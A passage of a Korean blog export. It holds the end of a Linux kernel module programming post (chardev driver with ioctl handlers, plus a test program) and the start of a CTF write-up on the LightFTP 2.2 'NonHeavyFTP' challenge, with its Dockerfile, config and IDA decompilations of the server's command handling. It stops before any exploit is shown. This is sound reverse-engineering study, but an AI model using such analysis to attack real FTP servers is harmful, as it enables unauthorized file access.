DRIVER_NAME); if (alloc_ret != 0) { printk(KERN_ERR \u0026#34;alloc_chrdev_region = %d\\n\u0026#34;, alloc_ret); return -1; } //Get the major number value in dev. chardev_major = MAJOR(dev); dev = MKDEV(chardev_major, MINOR_BASE); //initialize a cdev structure cdev_init(\u0026amp;chardev_cdev, \u0026amp;s_chardev_fops); chardev_cdev.owner = THIS_MODULE; //add a char device to the system cdev_err = cdev_add(\u0026amp;chardev_cdev, dev, MINOR_NUM); if (cdev_err != 0) { printk(KERN_ERR \u0026#34;cdev_add = %d\\n\u0026#34;, alloc_ret); unregister_chrdev_region(dev, MINOR_NUM); return -1; } chardev_class = class_create(THIS_MODULE, \u0026#34;chardev\u0026#34;); if (IS_ERR(chardev_class)) { printk(KERN_ERR \u0026#34;class_create\\n\u0026#34;); cdev_del(\u0026amp;chardev_cdev); unregister_chrdev_region(dev, MINOR_NUM); return -1; } device_create(chardev_class, NULL, MKDEV(chardev_major, minor), NULL, \u0026#34;chardev%d\u0026#34;, minor); return 0; } static void chardev_exit(void) { int minor = 0; dev_t dev = MKDEV(chardev_major, MINOR_BASE); printk(\u0026#34;The chardev_exit() function has been called.\u0026#34;); device_destroy(chardev_class, MKDEV(chardev_major, minor)); class_destroy(chardev_class); cdev_del(\u0026amp;chardev_cdev); unregister_chrdev_region(dev, MINOR_NUM); } static int chardev_open(struct inode *inode, struct file *file) { printk(\u0026#34;The chardev_open() function has been called.\u0026#34;); return 0; } static int chardev_release(struct inode *inode, struct file *file) { printk(\u0026#34;The chardev_close() function has been called.\u0026#34;); return 0; } static ssize_t chardev_write(struct file *filp, const char __user *buf, size_t count, loff_t *f_pos) { printk(\u0026#34;The chardev_write() function has been called.\u0026#34;); return count; } static ssize_t chardev_read(struct file *filp, char __user *buf, size_t count, loff_t *f_pos) { printk(\u0026#34;The chardev_read() function has been called.\u0026#34;); return count; } static struct ioctl_info info; static long chardev_ioctl(struct file *filp, unsigned int cmd, unsigned long arg) { printk(\u0026#34;The chardev_ioctl() function has been called.\u0026#34;); switch (cmd) { case SET_DATA: printk(\u0026#34;SET_DATA\\n\u0026#34;); if (copy_from_user(\u0026amp;info, (void __user *)arg, sizeof(info))) { return -EFAULT; } printk(\u0026#34;info.size : %ld, info.buf : %s\u0026#34;,info.size, info.buf); break; case GET_DATA: printk(\u0026#34;GET_DATA\\n\u0026#34;); if (copy_to_user((void __user *)arg, \u0026amp;info, sizeof(info))) { return -EFAULT; } break; default: printk(KERN_WARNING \u0026#34;unsupported command %d\\n\u0026#34;, cmd); return -EFAULT; } return 0; } module_init(chardev_init); module_exit(chardev_exit); #ifndef CHAR_DEV_H_ #define CHAR_DEV_H_ #include \u0026lt;linux/ioctl.h\u0026gt; struct ioctl_info{ unsigned long size; char buf[128]; }; #define IOCTL_MAGIC \u0026#39;G\u0026#39; #define SET_DATA _IOW(IOCTL_MAGIC, 2 ,struct ioctl_info) #define GET_DATA _IOR(IOCTL_MAGIC, 3 ,struct ioctl_info) #endif obj-m += chardev.o all: make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules clean: make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean 유저모드에서 ioctl을 호출하면 sys_ioctl이 호출되고, fops에 등록된 chardev_ioctl이 최종적으로 호출된다. 테스트 코드는 다음과 같다.\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;sys/ioctl.h\u0026gt; #include \u0026#34;chardev.h\u0026#34; int main() { int fd; struct ioctl_info set_info; struct ioctl_info get_info; set_info.size = 100; strncpy(set_info.buf,\u0026#34;lazenca.0x0\u0026#34;,11); if ((fd = open(\u0026#34;/dev/chardev0\u0026#34;, O_RDWR)) \u0026lt; 0){ printf(\u0026#34;Cannot open /dev/chardev0. Try again later.\\n\u0026#34;); } if (ioctl(fd, SET_DATA, \u0026amp;set_info) \u0026lt; 0){ printf(\u0026#34;Error : SET_DATA.\\n\u0026#34;); } if (ioctl(fd, GET_DATA, \u0026amp;get_info) \u0026lt; 0){ printf(\u0026#34;Error : SET_DATA.\\n\u0026#34;); } printf(\u0026#34;get_info.size : %ld, get_info.buf : %s\\n\u0026#34;, get_info.size, get_info.buf); if (close(fd) != 0){ printf(\u0026#34;Cannot close.\\n\u0026#34;); } return 0; } ","permalink":"https://msh1307.kr/blog/linux_kernel_module_programming/","summary":"Kernel module? 모듈은 사용자의 혹은 커널의 요구로 읽혀지거나 아니면 없어지는 코드들로 이루어진 프로그램의 어떤 한 조각을 의미한다. 커널은 하나의 큰 모듈들의 집합이라고 볼 수 있다. 모듈들을 통해서 필요할때 더 추가, 혹은 제거를 통해서 커널을 재컴파일 혹은 재가동하지 않고도 커널의 기능을 확장하거나 축소시킬 수 있다.\nlsmod insmod rmmod lsmod를 통해서 현재 커널에 있는 모듈들의 정보를 확인할 수 있다. 이때 lsmod는 /proc/modules를 읽고나서 좀 더 예쁘게 바꿔준다. insmod를 통해서 커널에 모듈을 적재할 수 있다.","title":"Linux kernel module programming"},{"content":"NonHeavyFTP 난이도가 Baby인거 보고 달려들었는데, 어려웠다.\nAnalysis [ftpconfig] port=2121 maxusers=10000000 interface=0.0.0.0 local_mask=255.255.255.255 minport=30000 maxport=60000 goodbyemsg=Goodbye! keepalive=1 [anonymous] pswd=* accs=readonly root=/server/data/ ftp 서비스의 config 파일이다.\nFROM ubuntu:22.04 ENV DEBIAN_FRONTEND noninteractive RUN apt-get update \u0026amp;\u0026amp;\\ apt-get install -y --no-install-recommends wget unzip gcc make libc6-dev gnutls-dev uuid RUN mkdir -p /server/data/ \u0026amp;\u0026amp;\\ echo \u0026#34;hello from LightFTP\u0026#34; \u0026gt;\u0026gt; /server/data/hello.txt \u0026amp;\u0026amp;\\ cd /server \u0026amp;\u0026amp;\\ wget --no-check-certificate https://codeload.github.com/hfiref0x/LightFTP/zip/refs/tags/v2.2 -O LightFTP-2.2.zip \u0026amp;\u0026amp;\\ unzip LightFTP-2.2.zip \u0026amp;\u0026amp;\\ cd LightFTP-2.2/Source/Release \u0026amp;\u0026amp;\\ make \u0026amp;\u0026amp;\\ cp -a ./fftp /server/ \u0026amp;\u0026amp;\\ cd /server \u0026amp;\u0026amp;\\ rm -rf LightFTP-2.2 LightFTP-2.2.zip COPY ./flag /flag COPY ./fftp.conf /server/fftp.conf RUN mv /flag /flag.`uuid` \u0026amp;\u0026amp;\\ useradd -M -d /server/ -U ftp WORKDIR /server EXPOSE 2121 CMD [\u0026#34;runuser\u0026#34;, \u0026#34;-u\u0026#34;, \u0026#34;ftp\u0026#34;, \u0026#34;-g\u0026#34;, \u0026#34;ftp\u0026#34;, \u0026#34;/server/fftp\u0026#34;, \u0026#34;/server/fftp.conf\u0026#34;] /flag 이름을 uuid를 통해서 랜덤하게 바꿔주고 있다. flag 파일의 이름을 알아내야할 필요가 있다.\nhttps://github.com/hfiref0x/LightFTP 그리고 깃헙을 뒤져보니 실제로 LightFTP가 있었다. 탈주뛸 준비를 하다가 발견해서 소스코드를 다운받고 분석했다.\n소스코드 디렉토리가 난잡해보여서 그냥 아이다로 까고 모르겠으면 소스코드를 봤다.\nint __cdecl __noreturn main(int argc, const char **argv, const char **envp) { char *v4; // rbp __int64 v5; // rax char *v6; // r12 int v7; // edi char *v8; // rax char *v9; // rax char *v10; // rax int v11; // ebx pthread_t v12[7]; // [rsp+0h] [rbp-38h] BYREF v12[1] = __readfsqword(0x28u); if ( argc \u0026lt;= 1 ) v4 = (char *)config_init(\u0026#34;fftp.conf\u0026#34;, argv, envp); else v4 = (char *)config_init(argv[1], argv, envp); if ( !v4 ) { __printf_chk(1LL, \u0026#34;Could not find configuration file\\r\\n\\r\\n Usage: fftp [CONFIGFILE]\\r\\n\\r\\n\u0026#34;); if ( g_log != -1 ) close(g_log); LABEL_31: ftp_tls_cleanup(); exit(2); } v5 = x_malloc(\u0026amp;_data_start); g_cfg = (__int64)v4; v6 = (char *)v5; in.s_addr = inet_addr(\u0026#34;127.0.0.1\u0026#34;); if ( (unsigned int)config_parse(v4, \u0026#34;ftpconfig\u0026#34;, \u0026#34;interface\u0026#34;, v6, (__int64)\u0026amp;_data_start) ) in.s_addr = inet_addr(v6); stru_1011C.s_addr = inet_addr(\u0026#34;0.0.0.0\u0026#34;); if ( (unsigned int)config_parse(v4, \u0026#34;ftpconfig\u0026#34;, \u0026#34;external_ip\u0026#34;, v6, (__int64)\u0026amp;_data_start) ) stru_1011C.s_addr = inet_addr(v6); stru_10120.s_addr = inet_addr(\u0026#34;255.255.255.0\u0026#34;); if ( (unsigned int)config_parse(v4, \u0026#34;ftpconfig\u0026#34;, \u0026#34;local_mask\u0026#34;, v6, (__int64)\u0026amp;_data_start) ) stru_10120.s_addr = inet_addr(v6); word_10110 = 21; if ( (unsigned int)config_parse(v4, \u0026#34;ftpconfig\u0026#34;, \u0026#34;port\u0026#34;, v6, (__int64)\u0026amp;_data_start) ) word_10110 = strtoul(v6, 0LL, 10); dword_10108 = 1; if ( (unsigned int)config_parse(v4, \u0026#34;ftpconfig\u0026#34;, \u0026#34;maxusers\u0026#34;, v6, (__int64)\u0026amp;_data_start) ) dword_10108 = strtoul(v6, 0LL, 10); dword_1010C = 0; if ( (unsigned int)config_parse(v4, \u0026#34;ftpconfig\u0026#34;, \u0026#34;keepalive\u0026#34;, v6, (__int64)\u0026amp;_data_start) ) dword_1010C = strtoul(v6, 0LL, 10); word_10112 = 1024; if ( (unsigned int)config_parse(v4, \u0026#34;ftpconfig\u0026#34;, \u0026#34;minport\u0026#34;, v6, (__int64)\u0026amp;_data_start) ) word_10112 = strtoul(v6, 0LL, 10); word_10114 = -1; if ( (unsigned int)config_parse(v4, \u0026#34;ftpconfig\u0026#34;, \u0026#34;maxport\u0026#34;, v6, (__int64)\u0026amp;_data_start) ) word_10114 = strtoul(v6, 0LL, 10); config_parse(v4, \u0026#34;ftpconfig\u0026#34;, \u0026#34;CATrustFile\u0026#34;, CAFILE, 4096LL); config_parse(v4, \u0026#34;ftpconfig\u0026#34;, \u0026#34;ServerCertificate\u0026#34;, CERTFILE, 4096LL); config_parse(v4, \u0026#34;ftpconfig\u0026#34;, \u0026#34;Keyfile\u0026#34;, KEYFILE, 4096LL); config_parse(v4, \u0026#34;ftpconfig\u0026#34;, \u0026#34;KeyfilePassword\u0026#34;, KEYFILE_PASS, 256LL); config_parse(v4, \u0026#34;ftpconfig\u0026#34;, \u0026#34;goodbyemsg\u0026#34;, GOODBYE_MSG, 128LL); memset(v6, 0, (size_t)\u0026amp;_data_start); if ( (unsigned int)config_parse(v4, \u0026#34;ftpconfig\u0026#34;, \u0026#34;logfilepath\u0026#34;, v6, (__int64)\u0026amp;_data_start) ) { g_log = open64(v6, 66, 384LL); v7 = g_log; if ( g_log == -1 ) { __printf_chk(1LL, \u0026#34;Error: Failed to open/create log file. Please check logfilepath: %s\\r\\n\u0026#34;, v6); __printf_chk( 1LL, \u0026#34;Possible errors: 1) path is invalid; 2) file is read only; 3) file is directory; 4) insufficient permissions\\r\\n\u0026#34;); LABEL_28: free(v4); if ( g_log != -1 ) close(g_log); free(v6); goto LABEL_31; } } else { __printf_chk(1LL, \u0026#34;WARNING: logfilepath section is not found in configuration. Logging to file disabled.\\r\\n\u0026#34;); v7 = g_log; if ( g_log == -1 ) { LABEL_22: __printf_chk(1LL, \u0026#34;\\r\\n [ LightFTP server v%s ]\\r\\n\\r\\n\u0026#34;, \u0026#34;2.2\u0026#34;); __printf_chk(1LL, \u0026#34;Log file : %s\\r\\n\u0026#34;, v6); if ( getcwd(v6, (size_t)\u0026amp;_data_start) ) __printf_chk(1LL, \u0026#34;Working dir : %s\\r\\n\u0026#34;, v6); if ( argc \u0026lt;= 1 ) __printf_chk(1LL, \u0026#34;Config file : %s/%s\\r\\n\u0026#34;, v6, \u0026#34;fftp.conf\u0026#34;); else __printf_chk(1LL, \u0026#34;Config file : %s\\r\\n\u0026#34;, argv[1]); v8 = inet_ntoa(in); __printf_chk(1LL, \u0026#34;Interface ipv4 : %s\\r\\n\u0026#34;, v8); v9 = inet_ntoa(stru_10120); __printf_chk(1LL, \u0026#34;Interface mask : %s\\r\\n\u0026#34;, v9); v10 = inet_ntoa(stru_1011C); __printf_chk(1LL, \u0026#34;External ipv4 : %s\\r\\n\u0026#34;, v10); __printf_chk(1LL, \u0026#34;Port : %u\\r\\n\u0026#34;, (unsigned __int16)word_10110); __printf_chk(1LL, \u0026#34;Max users : %u\\r\\n\u0026#34;, (unsigned int)dword_10108); __printf_chk(1LL, \u0026#34;PASV port range : %u..%u\\r\\n\u0026#34;, (unsigned __int16)word_10112, (unsigned __int16)word_10114); __printf_chk(1LL, \u0026#34;\\r\\n TYPE q or Ctrl+C to terminate \u0026gt;\\r\\n\u0026#34;); ftp_tls_init(); v12[0] = 0LL; if ( pthread_create(v12, 0LL, ftpmain, 0LL) ) { __printf_chk(1LL, \u0026#34;Error: Failed to create main server thread\\r\\n\u0026#34;); } else { do { v11 = getc(stdin); sleep(1u); } while ( (v11 \u0026amp; 0xFFFFFFDF) != \u0026#39;Q\u0026#39; ); } goto LABEL_28; } } lseek64(v7, 0LL, 2); goto LABEL_22; } 그냥 서버에서 화면? status? 띄워주는 함수다. 클라이언트랑은 상관없으니까 패스하고, ftpmain 함수부터 보면된다.\nvoid *__fastcall ftpmain(void *a1) { int v1; // eax int v2; // r12d _DWORD *v3; // rbp unsigned int v4; // eax __int64 v5; // rdx int v6; // r15d int *v7; // r14 int optval; // [rsp+10h] [rbp-68h] BYREF socklen_t addr_len; // [rsp+14h] [rbp-64h] BYREF pthread_t v11; // [rsp+18h] [rbp-60h] BYREF struct sockaddr addr; // [rsp+20h] [rbp-58h] BYREF unsigned __int64 v13; // [rsp+38h] [rbp-40h] v13 = __readfsqword(0x28u); v1 = socket(2, 1, 6); if ( v1 == -1 ) { __printf_chk(1LL, \u0026#34;\\r\\n socket create error\\r\\n\u0026#34;); } else { v2 = v1; optval = 1; setsockopt(v1, 1, 2, \u0026amp;optval, 4u); v3 = (_DWORD *)x_malloc(4LL * (unsigned int)dword_10108); if ( dword_10108 ) { v4 = 0; do { v5 = v4++; v3[v5] = -1; } while ( dword_10108 \u0026gt; v4 ); } addr.sa_family = 2; *(_QWORD *)\u0026amp;addr.sa_data[6] = 0LL; *(_WORD *)addr.sa_data = __ROL2__(word_10110, 8); *(struct in_addr *)\u0026amp;addr.sa_data[2] = in; if ( bind(v2, \u0026amp;addr, 0x10u) ) { __printf_chk(1LL, \u0026#34;\\r\\n Failed to start server. Can not bind to address\\r\\n\\r\\n\u0026#34;); free(v3); close(v2); } else { writelogentry(0LL, \u0026#34;220 LightFTP server ready\\r\\n\u0026#34;, \u0026#34;\u0026#34;); if ( !listen(v2, 4096) ) { while ( 1 ) { while ( 1 ) { do { addr_len = 16; addr = 0LL; v6 = accept(v2, \u0026amp;addr, \u0026amp;addr_len); } while ( v6 == -1 ); optval = -1; if ( !dword_10108 ) break; v7 = v3; while ( *v7 != -1 ) { if ( ++v7 == \u0026amp;v3[dword_10108] ) goto LABEL_16; } if ( dword_1010C ) socket_set_keepalive(v6); *v7 = v6; optval = pthread_create(\u0026amp;v11, 0LL, ftp_client_thread, v7); if ( optval ) { *v7 = -1; if ( optval ) break; } } LABEL_16: send(v6, \u0026#34;MAXIMUM ALLOWED USERS CONNECTED\\r\\n\u0026#34;, 0x21uLL, 0x4000); close(v6); } } free(v3); close(v2); } } return 0LL; } 마찬가지로 ftp_client_thread만 보면된다.\n// positive sp value has been detected, the output may be wrong! void *__fastcall ftp_client_thread(int *a1) { int v1; // edi __int64 v2; // rbp unsigned __int8 v4; // bl const unsigned __int16 **v5; // rax __int64 v6; // rdx const char *v7; // rbp __int64 v8; // rax size_t v9; // r13 char *v10; // rax char *v11; // rdx const char **v12; // r12 int v13; // ebx int v14; // ebp float v15; // xmm1_4 double v16; // xmm1_8 float v17; // xmm0_4 int *v18; // [rsp-100h] [rbp-6130h] char *v19; // [rsp-F8h] [rbp-6128h] pthread_mutexattr_t *v20; // [rsp-F0h] [rbp-6120h] socklen_t v21; // [rsp-DCh] [rbp-610Ch] BYREF void *v22; // [rsp-D8h] [rbp-6108h] BYREF pthread_mutexattr_t v23; // [rsp-CCh] [rbp-60FCh] BYREF struct sockaddr v24; // [rsp-C8h] [rbp-60F8h] BYREF pthread_mutex_t mutex; // [rsp-B8h] [rbp-60E8h] BYREF int v26; // [rsp-90h] [rbp-60C0h] int v27; // [rsp-8Ch] [rbp-60BCh] pthread_t v28; // [rsp-88h] [rbp-60B8h] __int64 v29; // [rsp-80h] [rbp-60B0h] int v30; // [rsp-78h] [rbp-60A8h] int v31; // [rsp-74h] [rbp-60A4h] int v32; // [rsp-70h] [rbp-60A0h] __int16 v33; // [rsp-6Ch] [rbp-609Ch] int v34; // [rsp-68h] [rbp-6098h] int v35; // [rsp-64h] [rbp-6094h] unsigned __int32 v36; // [rsp-5Ch] [rbp-608Ch] char v37; // [rsp-40h] [rbp-6070h] char v38; // [rsp+0h] [rbp-6030h] BYREF __int64 v39; // [rsp+1000h] [rbp-5030h] BYREF __int64 v40; // [rsp+4FC0h] [rbp-1070h] __int64 v41; // [rsp+4FC8h] [rbp-1068h] __int64 v42; // [rsp+4FD0h] [rbp-1060h] size_t v43; // [rsp+4FD8h] [rbp-1058h] size_t v44; // [rsp+4FE0h] [rbp-1050h] __int64 instr_recved[521]; // [rsp+4FE8h] [rbp-1048h] BYREF while ( \u0026amp;v38 != (char *)(\u0026amp;v39 - 3072) ) ; v18 = a1; instr_recved[513] = __readfsqword(0x28u); memset(\u0026amp;mutex, 0, 0x50A0uLL); v1 = *a1; v21 = 16; v26 = v1; v24 = 0LL; if ( !getsockname(v1, \u0026amp;v24, \u0026amp;v21) ) { v21 = 16; v30 = *(_DWORD *)\u0026amp;v24.sa_data[2]; v24 = 0LL; if ( !getpeername(v26, \u0026amp;v24, \u0026amp;v21) ) { v35 = 0; v31 = *(_DWORD *)\u0026amp;v24.sa_data[2]; v29 = 0xFFFFFFFFLL; v27 = -1; v36 = _InterlockedIncrement(\u0026amp;g_newid); v34 = -1; pthread_mutexattr_init(\u0026amp;v23); pthread_mutexattr_settype(\u0026amp;v23, 1); pthread_mutex_init(\u0026amp;mutex, \u0026amp;v23); v37 = 47; if ( v40 ) ((void (__fastcall *)(__int64, const char *, __int64))gnutls_record_send)( v40, \u0026#34;220 LightFTP server ready\\r\\n\u0026#34;, 27LL); else send(v26, \u0026#34;220 LightFTP server ready\\r\\n\u0026#34;, 0x1BuLL, 0x4000); memset(instr_recved, 0, 0x1000uLL); ((void (__fastcall *)(__int64 *, __int64, __int64, __int64, const char *, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD))__snprintf_chk)( instr_recved, 4096LL, 1LL, 4096LL, \u0026#34;\u0026lt;- New user IP=%u.%u.%u.%u:%u\u0026#34;, (unsigned __int8)v24.sa_data[2], (unsigned __int8)v24.sa_data[3], (unsigned __int8)v24.sa_data[4], HIBYTE(*(_DWORD *)\u0026amp;v24.sa_data[2]), (unsigned __int16)__ROL2__(*(_WORD *)v24.sa_data, 8)); writelogentry((__int64)\u0026amp;mutex, (__int64)instr_recved, (__int64)\u0026#34;\u0026#34;); do { LABEL_10: if ( v26 == -1 || !(unsigned int)recvcmd_part_0((__int64)\u0026amp;mutex, (char *)instr_recved, 0x1000LL) )// recvuntil \\r\\n break; v4 = instr_recved[0]; if ( LOBYTE(instr_recved[0]) ) { v5 = __ctype_b_loc(); v6 = 0LL; while ( ((*v5)[(char)v4] \u0026amp; 0x400) == 0 ) { ++v6; v4 = *((_BYTE *)instr_recved + v6); if ( !v4 ) { v7 = (char *)instr_recved + v6; goto LABEL_41; } } v7 = (char *)instr_recved + v6; v8 = v6; if ( (v4 \u0026amp; 0xDF) != 0 ) { do { ++v8; v4 = *((_BYTE *)instr_recved + v8); } while ( (v4 \u0026amp; 0xDF) != 0 ); v9 = v8 - v6; } else { v9 = 0LL; } while ( v4 == \u0026#39; \u0026#39; ) { ++v8; v4 = *((_BYTE *)instr_recved + v8); } v10 = (char *)instr_recved + v8; // Second Arg? v11 = 0LL; if ( v4 ) v11 = v10; v19 = v11; } else { v7 = (const char *)instr_recved; LABEL_41: v19 = 0LL; v9 = 0LL; } v12 = (const char **)\u0026amp;ftpprocs; v13 = 0; while ( strncasecmp(v7, *v12, v9) ) // instruction parsing { ++v13; v12 += 2; if ( v13 == 0x20 ) // instruction cnts -\u0026gt; 32 { writelogentry((__int64)\u0026amp;mutex, (__int64)\u0026#34; @@ CMD: \u0026#34;, (__int64)instr_recved); if ( v40 ) ((void (__fastcall *)(__int64, const char *, __int64))gnutls_record_send)( v40, \u0026#34;500 Syntax error, command unrecognized.\\r\\n\u0026#34;, 41LL); else send(v26, \u0026#34;500 Syntax error, command unrecognized.\\r\\n\u0026#34;, 0x29uLL, 0x4000); goto LABEL_10; } } v14 = ((__int64 (__fastcall *)(pthread_mutex_t *, char *))(\u0026amp;ftpprocs)[2 * v13 + 1])(\u0026amp;mutex, v19);// CALL FTP USR if ( v13 == 0xD ) writelogentry((__int64)\u0026amp;mutex, (__int64)\u0026#34; @@ CMD: \u0026#34;, (__int64)\u0026#34;PASS ***\u0026#34;); else writelogentry((__int64)\u0026amp;mutex, (__int64)\u0026#34; @@ CMD: \u0026#34;, (__int64)instr_recved); } while ( v14 \u0026gt; 0 ); v22 = 0LL; if ( !(_DWORD)v29 ) { HIDWORD(v29) = 1; sleep(2u); if ( pthread_join(v28, \u0026amp;v22) ) { writelogentry((__int64)\u0026amp;mutex, (__int64)\u0026#34;Enter cancel\u0026#34;, (__int64)\u0026#34;\u0026#34;); pthread_cancel(v28); } LODWORD(v29) = -1; } if ( v27 != -1 ) { close(v27); v27 = -1; } if ( v34 != -1 ) { close(v34); v34 = -1; } v32 = 0; v33 = 0; pthread_mutex_destroy(\u0026amp;mutex); pthread_mutexattr_destroy(v20); if ( v42 \u0026lt; 0 ) v15 = (float)(v42 \u0026amp; 1 | (unsigned int)((unsigned __int64)v42 \u0026gt;\u0026gt; 1)) + (float)(v42 \u0026amp; 1 | (unsigned int)((unsigned __int64)v42 \u0026gt;\u0026gt; 1)); else v15 = (float)(int)v42; v16 = (float)(v15 * 0.00000095367432); if ( v41 \u0026lt; 0 ) v17 = (float)(v41 \u0026amp; 1 | (unsigned int)((unsigned __int64)v41 \u0026gt;\u0026gt; 1)) + (float)(v41 \u0026amp; 1 | (unsigned int)((unsigned __int64)v41 \u0026gt;\u0026gt; 1)); else v17 = (float)(int)v41; ((void (*)(__int64 *, __int64, __int64, __int64, const char *, ...))__snprintf_chk)( instr_recved, 4096LL, 1LL, 4096LL, \u0026#34; User disconnected. \\n\u0026#34; \u0026#34;==== Session %u statistics ====\\n\u0026#34; \u0026#34;Rx: %zd bytes (%f MBytes) total received by server in %zd files,\\n\u0026#34; \u0026#34;Tx: %zd bytes (%f MBytes) total sent to the client in %zd files.\\n\u0026#34;, v36, v41, (float)(v17 * 0.00000095367432), v43, v42, v16, v44); writelogentry((__int64)\u0026amp;mutex, (__int64)instr_recved, (__int64)\u0026#34;\u0026#34;); } } v2 = v40; if ( v40 ) { ((void (__fastcall *)(__int64, _QWORD))gnutls_bye)(v40, 0LL); ((void (__fastcall *)(__int64))gnutls_deinit)(v2); } close(v26); *v18 = -1; return 0LL; } recvcmd_part_0 함수는 \\r\\n으로 끝나는 명령어가 오면, instruction operand로 잘 분리해서 저장해주고, 함수를 호출한다.\n.data.rel.ro:000000000000F8E0 ftpprocs dq offset aUser_0 ; DATA XREF: ftp_client_thread:loc_9A3E↑o .data.rel.ro:000000000000F8E0 ; ftp_client_thread+326↑o .data.rel.ro:000000000000F8E0 ; \u0026#34;USER\u0026#34; .data.rel.ro:000000000000F8E8 dq offset ftpUSER .data.rel.ro:000000000000F8F0 dq offset aQuit+1 ; \u0026#34;QUIT\u0026#34; .data.rel.ro:000000000000F8F8 dq offset ftpQUIT .data.rel.ro:000000000000F900 dq offset aNoop ; \u0026#34;NOOP\u0026#34; .data.rel.ro:000000000000F908 dq offset ftpNOOP .data.rel.ro:000000000000F910 dq offset aPwd ; \u0026#34;PWD\u0026#34; .data.rel.ro:000000000000F918 dq offset ftpPWD .data.rel.ro:000000000000F920 dq offset aType ; \u0026#34;TYPE\u0026#34; .data.rel.ro:000000000000F928 dq offset ftpTYPE .data.rel.ro:000000000000F930 dq offset aPort_0 ; \u0026#34;PORT\u0026#34; .data.rel.ro:000000000000F938 dq offset ftpPORT .data.rel.ro:000000000000F940 dq offset aList+1 ; \u0026#34;LIST\u0026#34; .data.rel.ro:000000000000F948 dq offset ftpLIST .data.rel.ro:000000000000F950 dq offset aCdup+1 ; \u0026#34;CDUP\u0026#34; .data.rel.ro:000000000000F958 dq offset ftpCDUP .data.rel.ro:000000000000F960 dq offset aCwd_0 ; \u0026#34;CWD\u0026#34; .data.rel.ro:000000000000F968 dq offset ftpCWD .data.rel.ro:000000000000F970 dq offset aRetr_0 ; \u0026#34;RETR\u0026#34; .data.rel.ro:000000000000F978 dq offset ftpRETR .data.rel.ro:000000000000F980 dq offset aAbor ; \u0026#34;ABOR\u0026#34; .data.rel.ro:000000000000F988 dq offset ftpABOR .data.rel.ro:000000000000F990 dq offset aDele_0 ; \u0026#34;DELE\u0026#34; .data.rel.ro:000000000000F998 dq offset ftpDELE .data.rel.ro:000000000000F9A0 dq offset aPasv ; \u0026#34;PASV\u0026#34; .data.rel.ro:000000000000F9A8 dq offset ftpPASV .data.rel.ro:000000000000F9B0 dq offset aPass_0 ; \u0026#34;PASS\u0026#34; .data.rel.ro:000000000000F9B8 dq offset ftpPASS .data.rel.ro:000000000000F9C0 dq offset aRest ; \u0026#34;REST\u0026#34; .data.rel.ro:000000000000F9C8 dq offset ftpREST .data.rel.ro:000000000000F9D0 dq offset aSize_0 ; \u0026#34;SIZE\u0026#34; .data.rel.ro:000000000000F9D8 dq offset ftpSIZE .data.rel.ro:000000000000F9E0 dq offset aMkd_0 ; \u0026#34;MKD\u0026#34; .data.rel.ro:000000000000F9E8 dq offset ftpMKD .data.rel.ro:000000000000F9F0 dq offset aRmd ; \u0026#34;RMD\u0026#34; .data.rel.ro:000000000000F9F8 dq offset ftpRMD .data.rel.ro:000000000000FA00 dq offset aStor_0 ; \u0026#34;STOR\u0026#34; .data.rel.ro:000000000000FA08 dq offset ftpSTOR .data.rel.ro:000000000000FA10 dq offset aSyst ; \u0026#34;SYST\u0026#34; .data.rel.ro:000000000000FA18 dq offset ftpSYST .data.rel.ro:000000000000FA20 dq offset aFeat ; \u0026#34;FEAT\u0026#34; .data.rel.ro:000000000000FA28 dq offset ftpFEAT .data.rel.ro:000000000000FA30 dq offset aAppe_0 ; \u0026#34;APPE\u0026#34; .data.rel.ro:000000000000FA38 dq offset ftpAPPE .data.rel.ro:000000000000FA40 dq offset aRnfr_0 ; \u0026#34;RNFR\u0026#34; .data.rel.ro:000000000000FA48 dq offset ftpRNFR .data.rel.ro:000000000000FA50 dq offset aRnto_0 ; \u0026#34;RNTO\u0026#34; .data.rel.ro:000000000000FA58 dq offset ftpRNTO .data.rel.ro:000000000000FA60 dq offset aOpts ; \u0026#34;OPTS\u0026#34; .data.rel.ro:000000000000FA68 dq offset ftpOPTS .data.rel.ro:000000000000FA70 dq offset aMlsd ; \u0026#34;MLSD\u0026#34; .data.rel.ro:000000000000FA78 dq offset ftpMLSD .data.rel.ro:000000000000FA80 dq offset aAuth ; \u0026#34;AUTH\u0026#34; .data.rel.ro:000000000000FA88 dq offset ftpAUTH .data.rel.ro:000000000000FA90 dq offset aPbsz ; \u0026#34;PBSZ\u0026#34; .data.rel.ro:000000000000FA98 dq offset ftpPBSZ .data.rel.ro:000000000000FAA0 dq offset aProt ; \u0026#34;PROT\u0026#34; .data.rel.ro:000000000000FAA8 dq offset ftpPROT .data.rel.ro:000000000000FAB0 dq offset aEpsv ; \u0026#34;EPSV\u0026#34; .data.rel.ro:000000000000FAB8 dq offset ftpEPSV .data.rel.ro:000000000000FAC0 dq offset aHelp_0 ; \u0026#34;HELP\u0026#34; .data.rel.ro:000000000000FAC8 dq offset ftpHELP .data.rel.ro:000000000000FAD0 dq offset aSite ; \u0026#34;SITE\u0026#34; .data.rel.ro:000000000000FAD8 dq offset ftpSITE .data.rel.ro:000000000000FAD8 _data_rel_ro ends .data.rel.ro:000000000000FAD8 이런식으로 string과 함수 주소가 잘 매칭되어있다.\n_BOOL8 __fastcall ftpUSER(char *mutex, char *user_name) { size_t v2; // rdx if ( user_name ) { *((_DWORD *)mutex + 22) = 0; writelogentry((__int64)mutex, (__int64)\u0026#34; USER: \u0026#34;, (__int64)user_name); __snprintf_chk((__int64)(mutex + 0x3078), 0x2000LL, 1LL, 0x2000LL, \u0026#34;331 User %s OK. Password required\\r\\n\u0026#34;); v2 = strlen(mutex + 0x3078); // make string if ( *((_QWORD *)mutex + 0xA0F) ) gnutls_record_send(); else send(*((_DWORD *)mutex + 10), mutex + 0x3078, v2, 0x4000); __strcpy_chk(mutex + 0x3078, user_name, 0x2000uLL); return 1LL; } else if ( *((_QWORD *)mutex + 0xA0F) ) { return gnutls_record_send() \u0026gt;= 0; } else { return send(*((_DWORD *)mutex + 10), \u0026#34;501 Syntax error in parameters or arguments.\\r\\n\u0026#34;, 0x2EuLL, 0x4000) \u0026gt;= 0; } } ftpUSER 함수는 유저 이름 받는 함수이다. 이때 config_parse를 통해서 config 파일에서 그 유저에 대한 접근 권한, root path에 대한 정보를 받아온다. 그 이후 PASS로 비밀번호 인증하라고 